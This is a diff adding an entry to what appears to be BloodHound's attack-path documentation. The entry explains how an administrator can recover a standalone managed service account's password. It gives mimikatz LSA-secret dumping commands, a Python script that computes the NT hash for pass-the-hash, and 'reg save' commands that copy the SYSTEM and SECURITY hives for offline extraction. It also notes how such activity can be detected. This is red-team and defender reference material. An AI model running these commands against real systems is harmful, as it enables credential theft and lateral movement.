@@ -2117,6 +2117,86 @@ References
 
 |
 
+DumpSMSAPassword
+^^^^^^^^^^^^^^^^^^^^
+
+A computer with this indicates that a Standalone Managed Service Account (sMSA)
+is installed on it. An actor with administrative privileges on the computer
+can retrieve the sMSA's password by dumping LSA secrets.
+
+Abuse Info
+------------
+
+From an elevated command prompt on the computer where the sMSA resides, run
+mimikatz then execute the following commands:
+
+::
+
+    privilege::debug
+    token::elevate
+    lsadump::secrets
+
+In the output, find *_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_* suffixed by the
+name of the targeted sMSA. The next line contains *cur/hex :* followed with the
+sMSA's password hex-encoded.
+
+To use this password, its NT hash must be calculated. This can be done using
+a small python script:
+
+::
+
+    # nt.py
+    import sys, hashlib
+
+    pw_hex = sys.argv[1]
+    nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()
+
+    print(nt_hash)
+
+Execute it like so:
+
+::
+
+    python3 nt.py 35f3e1713d61...
+
+To authenticate as the sMSA, leverage pass-the-hash.
+
+Alternatively, to avoid executing mimikatz on the host, you can save a copy of
+the *SYSTEM* and *SECURITY* registry hives from an elevated prompt:
+
+::
+
+    reg save HKLM\SYSTEM %temp%\SYSTEM & reg save HKLM\SECURITY %temp%\SECURITY
+
+Transfer the files named *SYSTEM* and *SECURITY* that were saved at *%temp%* to
+another computer where mimikatz can be safely executed.
+
+On this other computer, run mimikatz from a command prompt then execute the
+following command to obtain the hex-encoded password:
+
+::
+
+    lsadump::secrets /system:C:\path\to\file\SYSTEM /security:C:\path\to\file\SECURITY
+
+Opsec Considerations
+--------------------
+
+Access to registry hives can be monitored and alerted via event ID 4656
+(A handle to an object was requested).
+
+References
+----------
+
+* https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html
+* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets
+* https://github.com/gentilkiwi/mimikatz
+
+|
+
+----
+
+|
+
 AZAddMembers
 ^^^^^^^^^^^^
 
